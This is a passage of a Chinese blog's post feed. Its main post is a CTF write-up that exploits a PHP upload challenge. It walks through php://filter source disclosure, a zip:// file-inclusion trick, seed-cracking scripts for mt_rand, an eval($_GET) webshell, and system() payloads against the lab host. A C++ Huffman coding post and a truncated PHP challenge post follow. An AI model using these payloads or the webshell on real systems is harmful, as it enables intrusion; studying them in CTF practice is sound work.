class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    session_start();</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'page'</span>]))&#123;</span><br><span class="line">        $page=$_GET[<span class="string">'page'</span>];</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $page=<span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/\.\./'</span>,$page)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;div class=\"msg error\" id=\"message\"&gt;</span></span><br><span class="line"><span class="string">        &lt;i class=\"fa fa-exclamation-triangle\"&gt;&lt;/i&gt;Attack Detected!&lt;/div&gt;"</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>($page) &#123;</span><br><span class="line">        <span class="keyword">if</span>(!(<span class="keyword">include</span>($page.<span class="string">'.php'</span>))) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;div class=\"msg error\" id=\"message\"&gt;</span></span><br><span class="line"><span class="string">        &lt;i class=\"fa fa-exclamation-triangle\"&gt;&lt;/i&gt;error!&lt;/div&gt;"</span>;</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>index.php 没太多用处，核心在 upload.php。</p><p><a href="http://111.198.29.45:30117/?page=php://filter/read=convert.base64-encode/resource=upload" target="_blank" rel="noopener">http://111.198.29.45:30117/?page=php://filter/read=convert.base64-encode/resource=upload</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">show_error_message</span><span class="params">($message)</span> </span>&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"&lt;div class=\"msg error\" id=\"message\"&gt;</span></span><br><span class="line"><span class="string">&lt;i class=\"fa fa-exclamation-triangle\"&gt;&lt;/i&gt;$message&lt;/div&gt;"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">show_message</span><span class="params">($message)</span> </span>&#123;</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">"&lt;div class=\"msg success\" id=\"message\"&gt;</span></span><br><span class="line"><span class="string">&lt;i class=\"fa fa-exclamation-triangle\"&gt;&lt;/i&gt;$message&lt;/div&gt;"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">random_str</span><span class="params">($length = <span class="string">"32"</span>)</span> </span>&#123;</span><br><span class="line">$set = <span class="keyword">array</span>(<span class="string">"a"</span>, <span class="string">"A"</span>, <span class="string">"b"</span>, <span class="string">"B"</span>, <span class="string">"c"</span>, <span class="string">"C"</span>, <span class="string">"d"</span>, <span class="string">"D"</span>, <span class="string">"e"</span>, <span class="string">"E"</span>, <span class="string">"f"</span>, <span class="string">"F"</span>,</span><br><span class="line"><span class="string">"g"</span>, <span class="string">"G"</span>, <span class="string">"h"</span>, <span class="string">"H"</span>, <span class="string">"i"</span>, <span class="string">"I"</span>, <span class="string">"j"</span>, <span class="string">"J"</span>, <span class="string">"k"</span>, <span class="string">"K"</span>, <span class="string">"l"</span>, <span class="string">"L"</span>,</span><br><span class="line"><span class="string">"m"</span>, <span class="string">"M"</span>, <span class="string">"n"</span>, <span class="string">"N"</span>, <span class="string">"o"</span>, <span class="string">"O"</span>, <span class="string">"p"</span>, <span class="string">"P"</span>, <span class="string">"q"</span>, <span class="string">"Q"</span>, <span class="string">"r"</span>, <span class="string">"R"</span>,</span><br><span class="line"><span class="string">"s"</span>, <span class="string">"S"</span>, <span class="string">"t"</span>, <span class="string">"T"</span>, <span class="string">"u"</span>, <span class="string">"U"</span>, <span class="string">"v"</span>, <span class="string">"V"</span>, <span class="string">"w"</span>, <span class="string">"W"</span>, <span class="string">"x"</span>, <span class="string">"X"</span>,</span><br><span class="line"><span class="string">"y"</span>, <span class="string">"Y"</span>, <span class="string">"z"</span>, <span class="string">"Z"</span>, <span class="string">"1"</span>, <span class="string">"2"</span>, <span class="string">"3"</span>, <span class="string">"4"</span>, <span class="string">"5"</span>, <span class="string">"6"</span>, <span class="string">"7"</span>, <span class="string">"8"</span>, <span class="string">"9"</span>);</span><br><span class="line">$str = <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">1</span>; $i &lt;= $length; ++$i) &#123;</span><br><span class="line">$ch = mt_rand(<span class="number">0</span>, count($set) - <span class="number">1</span>);</span><br><span class="line">$str .= $set[$ch];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">$reg=<span class="string">'/gif|jpg|jpeg|png/'</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">$seed = rand(<span class="number">0</span>,<span class="number">999999999</span>);  <span class="comment">// 生成随机数做种子</span></span><br><span class="line">mt_srand($seed);  <span class="comment">// 用seed给随机数发生器播种</span></span><br><span class="line">$ss = mt_rand();  <span class="comment">// 取随机数</span></span><br><span class="line"></span><br><span class="line">        $hash = md5(session_id() . $ss);  <span class="comment">// session_id() 是可控的，设为 0 或者很短的值</span></span><br><span class="line">        <span class="comment">// 服务端对 session_id() 的态度：你有用你的，你没有我给你设。</span></span><br><span class="line"></span><br><span class="line">        setcookie(<span class="string">'SESSI0N'</span>, $hash, time() + <span class="number">3600</span>);</span><br><span class="line"><span class="comment">// 此处是设置 SESSION </span></span><br><span class="line">        </span><br><span class="line"><span class="keyword">if</span> ($_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>] &gt; <span class="number">0</span>) &#123;</span><br><span class="line">show_error_message(<span class="string">"Upload ERROR. Return Code: "</span> . $_FILES[<span class="string">"file-upload-field"</span>][<span class="string">"error"</span>]);</span><br><span class="line">&#125;</span><br><span class="line">$check2 = ((($_FILES[<span class="string">"file-upload-field"</span>][<span class="string">"type"</span>] == <span class="string">"image/gif"</span>)</span><br><span class="line">|| ($_FILES[<span class="string">"file-upload-field"</span>][<span class="string">"type"</span>] == <span class="string">"image/jpeg"</span>)</span><br><span class="line">|| ($_FILES[<span class="string">"file-upload-field"</span>][<span class="string">"type"</span>] == <span class="string">"image/pjpeg"</span>)</span><br><span class="line">|| ($_FILES[<span class="string">"file-upload-field"</span>][<span class="string">"type"</span>] == <span class="string">"image/png"</span>))</span><br><span class="line">&amp;&amp; ($_FILES[<span class="string">"file-upload-field"</span>][<span class="string">"size"</span>] &lt; <span class="number">204800</span>));</span><br><span class="line">$check3 = !preg_match($reg,pathinfo($_FILES[<span class="string">'file-upload-field'</span>][<span class="string">'name'</span>], PATHINFO_EXTENSION));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($check3) show_error_message(<span class="string">"Nope!"</span>);</span><br><span class="line"><span class="keyword">if</span> ($check2) &#123;</span><br><span class="line">$filename = <span class="string">'./uP1O4Ds/'</span> . random_str() . <span class="string">'_'</span> . $_FILES[<span class="string">'file-upload-field'</span>][<span class="string">'name'</span>];</span><br><span class="line"><span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'file-upload-field'</span>][<span class="string">'tmp_name'</span>], $filename)) &#123;</span><br><span class="line">show_message(<span class="string">"Upload successfully. File type:"</span> . $_FILES[<span class="string">"file-upload-field"</span>][<span class="string">"type"</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> show_error_message(<span class="string">"Something wrong with the upload..."</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">show_error_message(<span class="string">"only allow gif/jpeg/png files smaller than 200kb!"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>\$filename = ‘./uP1O4Ds/‘ . random_str() . ‘_’ . $_FILES[‘file-upload-field’][‘name’];</p></blockquote><p>由此可知，重点是预测 random_str() 的值。</p><p>联想到此前的 2018 SWPUCTF 用优惠码买个X？<a href="https://www.anquanke.com/post/id/168308" target="_blank" rel="noopener">SWPUCTF wp</a></p><p>因此我们只要得到 mt_srand() 函数的播种种子的值，就可以预测出24位的优惠码。</p><blockquote><p>测试发现无论是rand()函数还是mt_rand()函数,当随机数种子相同的时候,无论运行多少次,产生的随机数序列都是一样的,所以如果我们在代码中自己播种了随机数种子,但是泄露了这个种子,就会导致产生的随机数序列被别人猜到,造成安全问题.</p></blockquote><p>对于这个题也类似，只要得到种子，就能预测。</p><p><a href="http://wonderkun.cc/index.html/?p=585" target="_blank" rel="noopener">php的随机数的安全性分析</a> <a href="https://www.openwall.com/php_mt_seed/" target="_blank" rel="noopener">大牛的爆破种子神器</a></p><p>直接强行爆破太麻烦了，先爆出一个随机数，利用这个随机数去爆破它的种子。</p><p>将 test.php 文件打个压缩包 test.zip，然后改后缀名 test.png，利用 zip:// 解压缩读取</p><p><a href="http://111.198.29.45:30117/?page=zip://uP1O4Ds/Ah86F1AZxgsLc8UUjkHPZRKMoCM3XUdT_test.png%23test/test&amp;a=phpinfo()" target="_blank" rel="noopener">http://111.198.29.45:30117/?page=zip://uP1O4Ds/Ah86F1AZxgsLc8UUjkHPZRKMoCM3XUdT_test.png%23test/test&amp;a=phpinfo()</a>;</p><p>种子确定了，随机值也确定了，直接利用源代码中的方式就能推出路径。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">$std = <span class="string">"6f51b1f6ba8ee543732b21dbe0efacb9"</span>;  <span class="comment">// cookie 中的 SESSION</span></span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;=<span class="number">999999999</span>;$i++) &#123;</span><br><span class="line">        $ha = md5(<span class="string">"0"</span> . $i);</span><br><span class="line">        <span class="keyword">if</span>($ha === $std) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Success-----------=&gt;"</span> . $i;</span><br><span class="line">            <span class="comment">// 爆出随机数为 i</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>($i % <span class="number">100000000</span> == <span class="number">0</span>) <span class="keyword">echo</span> $i . <span class="string">"\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>得出随机数</p><p><img src="https://i.loli.net/2018/12/30/5c28b5e0bea95.png" alt="屏幕捕获_2018_12_30_19_58_38_361.png"></p><p>然后利用神器，爆出种子</p><p><img src="https://i.loli.net/2018/12/30/5c28b5e1033b1.png" alt="屏幕捕获_2018_12_30_20_10_40_322.png"></p><p>利用这个脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 爆出来的种子</span></span><br><span class="line">$arr = <span class="keyword">array</span>(<span class="number">76047661</span>,<span class="number">1136899518</span>,<span class="number">1497431590</span>,<span class="number">2832522619</span>);  </span><br><span class="line"><span class="keyword">foreach</span>($arr <span class="keyword">as</span> $a) &#123;</span><br><span class="line">    mt_srand($a);</span><br><span class="line">    $set = <span class="keyword">array</span>(<span class="string">"a"</span>, <span class="string">"A"</span>, <span class="string">"b"</span>, <span class="string">"B"</span>, <span class="string">"c"</span>, <span class="string">"C"</span>, <span class="string">"d"</span>, <span class="string">"D"</span>, <span class="string">"e"</span>, <span class="string">"E"</span>, <span class="string">"f"</span>, <span class="string">"F"</span>,</span><br><span class="line">                 <span class="string">"g"</span>, <span class="string">"G"</span>, <span class="string">"h"</span>, <span class="string">"H"</span>, <span class="string">"i"</span>, <span class="string">"I"</span>, <span class="string">"j"</span>, <span class="string">"J"</span>, <span class="string">"k"</span>, <span class="string">"K"</span>, <span class="string">"l"</span>, <span class="string">"L"</span>,</span><br><span class="line">                 <span class="string">"m"</span>, <span class="string">"M"</span>, <span class="string">"n"</span>, <span class="string">"N"</span>, <span class="string">"o"</span>, <span class="string">"O"</span>, <span class="string">"p"</span>, <span class="string">"P"</span>, <span class="string">"q"</span>, <span class="string">"Q"</span>, <span class="string">"r"</span>, <span class="string">"R"</span>,</span><br><span class="line">                 <span class="string">"s"</span>, <span class="string">"S"</span>, <span class="string">"t"</span>, <span class="string">"T"</span>, <span class="string">"u"</span>, <span class="string">"U"</span>, <span class="string">"v"</span>, <span class="string">"V"</span>, <span class="string">"w"</span>, <span class="string">"W"</span>, <span class="string">"x"</span>, <span class="string">"X"</span>,</span><br><span class="line">                 <span class="string">"y"</span>, <span class="string">"Y"</span>, <span class="string">"z"</span>, <span class="string">"Z"</span>, <span class="string">"1"</span>, <span class="string">"2"</span>, <span class="string">"3"</span>, <span class="string">"4"</span>, <span class="string">"5"</span>, <span class="string">"6"</span>, <span class="string">"7"</span>, <span class="string">"8"</span>, <span class="string">"9"</span>);</span><br><span class="line">    $str = <span class="string">''</span>;</span><br><span class="line">    $ss = mt_rand();  <span class="comment">// 这一步必须加上，否则与服务器端的随机值对应不上</span></span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">1</span>; $i &lt;= <span class="number">32</span>; ++$i) &#123;</span><br><span class="line">        $ch = mt_rand(<span class="number">0</span>, count($set) - <span class="number">1</span>);</span><br><span class="line">        $str .= $set[$ch];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// echo 'zip://uP1O4Ds/' . $str . '_test.png%23test&amp;a=phpinfo();' . "&lt;br&gt;";</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'http://111.198.29.45:30117/uP1O4Ds/'</span> . $str . <span class="string">'_test.png'</span> . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先检查地址是否有效，然后利用之前传的后门进行命令执行。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// test.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">eval</span>($_GET[<span class="string">'a'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>最后的 payload 如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://111.198.29.45:30117/?page=zip://uP1O4Ds/Ah86F1AZxgsLc8UUjkHPZRKMoCM3XUdT_test.png%23test/test&amp;a=echo%20system(%27ls%27);</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> test.png%23test&amp;a=echo%20system(%27ls%27); 这样是不行的，网上都是这个路子==，找时间整理下</span><br><span class="line"></span><br><span class="line">CSS flag-Edi98vJF8hnIp.txt index.html index.php js uP1O4Ds upload.php upload.php</span><br></pre></td></tr></table></figure><p>然后 cat flag</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">111.198</span>.<span class="number">29.45</span>:<span class="number">30117</span>/?page=zip://uP<span class="number">1</span>O<span class="number">4</span>Ds/Ah<span class="number">86</span>F<span class="number">1</span>AZxgsLc<span class="number">8</span>UUjkHPZRKMoCM<span class="number">3</span>XUdT_test.png<span class="symbol">%23</span>test/test&amp;a=echo<span class="symbol">%20</span>system(<span class="symbol">%27</span>cat<span class="symbol">%20</span>./flag-Ed<span class="keyword">i98</span>vJF<span class="number">8</span>hnIp.txt<span class="symbol">%27</span>)<span class="comment">;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">xctf&#123;3fbbe15371c9cd42ec1a698d7660849a&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;粗一看，是文件上传的题目。&lt;/p&gt;
&lt;p&gt;随便传一个文件试试，测试可知，只是验证后缀，改后缀即可绕过。&lt;/p&gt;
&lt;p&gt;问题是文件传到哪里去了，这也是本题的核心考点。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://111.198.29.45:30117/?page=uploa
      
    
    </summary>
    
    
      <category term="Writeup" scheme="https://wywwzjj.top/tags/Writeup/"/>
    
      <category term="php 伪随机数" scheme="https://wywwzjj.top/tags/php-%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0/"/>
    
  </entry>
  
  <entry>
    <title>优雅实现哈夫曼编码</title>
    <link href="https://wywwzjj.top/2018/12/28/%E4%BC%98%E9%9B%85%E5%AE%9E%E7%8E%B0%E5%93%88%E5%A4%AB%E6%9B%BC%E7%BC%96%E7%A0%81/"/>
    <id>https://wywwzjj.top/2018/12/28/优雅实现哈夫曼编码/</id>
    <published>2018-12-28T05:05:00.000Z</published>
    <updated>2019-03-31T01:32:09.271Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span> &#123;</span></span><br><span class="line">    <span class="keyword">char</span> data;</span><br><span class="line">    <span class="keyword">int</span> freq;</span><br><span class="line">    Node *lChild, *rChild;</span><br><span class="line"></span><br><span class="line">    Node(<span class="keyword">char</span> data, <span class="keyword">int</span> freq) : data(data), freq(freq) &#123;</span><br><span class="line">        lChild = rChild = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 仿函数，给极小化堆用</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cmp</span> &#123;</span></span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">operator</span><span class="params">()</span> <span class="params">(<span class="keyword">const</span> Node* a, <span class="keyword">const</span> Node* b)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> a-&gt;freq &gt; b-&gt;freq;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(Node* root, <span class="built_in">string</span> str)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(root == <span class="literal">NULL</span>) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(root-&gt;data != <span class="string">'#'</span>)  <span class="comment">// 有数据才打印</span></span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;root-&gt;data&lt;&lt;<span class="string">": "</span>&lt;&lt;str&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 左0右1</span></span><br><span class="line">    print(root-&gt;lChild, str + <span class="string">'0'</span>);</span><br><span class="line">    print(root-&gt;rChild, str + <span class="string">'1'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Huffman</span><span class="params">(<span class="keyword">char</span>* data, <span class="keyword">int</span>* freq, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    priority_queue&lt;Node*, <span class="built_in">vector</span>&lt;Node*&gt;, cmp&gt; pq;  <span class="comment">// 建立极小化堆</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">        pq.push(<span class="keyword">new</span> Node(data[i], freq[i]));  <span class="comment">// 把指针存进去</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(pq.size() &gt; <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="comment">// 取最小的两个</span></span><br><span class="line">        Node* left = pq.top(); pq.pop();</span><br><span class="line">        Node* right = pq.top(); pq.pop();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 合并为一个，权重相加，‘#’作为一个标志，非叶节点，无数据</span></span><br><span class="line">        Node* top = <span class="keyword">new</span> Node(<span class="string">'#'</span>, left-&gt;freq + right-&gt;freq);</span><br><span class="line"></span><br><span class="line">        top-&gt;lChild = left;</span><br><span class="line">        top-&gt;rChild = right;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 再投入堆中</span></span><br><span class="line">        pq.push(top);</span><br><span class="line">    &#125;</span><br><span class="line">    print(pq.top(), <span class="string">""</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"请输入字符个数"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">int</span> n; <span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span>* data = <span class="keyword">new</span> <span class="keyword">char</span>[n+<span class="number">5</span>];</span><br><span class="line">    <span class="keyword">int</span>* freq = <span class="keyword">new</span> <span class="keyword">int</span>[n+<span class="number">5</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"请输入字符及对应的权重："</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;data[i]&gt;&gt;freq[i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Huffman(data, freq, n);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">delete</span>(data);</span><br><span class="line">    <span class="keyword">delete</span>(freq);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;figure class=&quot;highlight c++&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;
      
    
    </summary>
    
    
      <category term="算法" scheme="https://wywwzjj.top/tags/%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>Please don&#39;t stop rua 233333</title>
    <link href="https://wywwzjj.top/2018/12/08/Please_don&#39;t_stop_rua_233333/"/>
    <id>https://wywwzjj.top/2018/12/08/Please_don&#39;t_stop_rua_233333/</id>
    <published>2018-12-08T10:09:27.000Z</published>
    <updated>2019-02-28T09:02:33.988Z</updated>
    
    <content type="html"><![CDATA[<p><a href="http://123.206.31.85:10012/" target="_blank" rel="noopener">原题网址</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Time</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $flag = xxxxx;</span><br><span class="line"><span class="keyword">public</span> $truepassword = xxxxx;</span><br><span class="line"><span class="keyword">public</span> $time;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">construct</span><span class="params">($tt, $pp)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;time = $tt;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = $pp;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span 